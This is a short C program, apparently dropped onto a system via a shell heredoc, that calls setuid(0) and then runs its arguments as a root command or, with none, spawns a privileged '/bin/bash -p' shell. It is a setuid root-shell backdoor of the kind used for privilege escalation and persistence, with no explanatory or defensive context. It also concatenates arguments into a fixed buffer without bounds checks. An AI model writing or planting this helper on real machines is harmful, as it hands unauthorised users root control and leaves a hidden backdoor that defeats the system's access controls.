#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <string.h>

int main(int argc, char *argv[]) {
    if (setuid(0) == -1) {
        perror("setuid failed");
        exit(1);
    }
    if (argc > 1) {
        char command[1024] = {0};
        for (int i = 1; i < argc; i++) {
            strcat(command, argv[i]);
            if (i < argc - 1) strcat(command, " ");
        }
        system(command);
    } else {
        system("/bin/bash -p");
    }
    return 0;
}
EOF

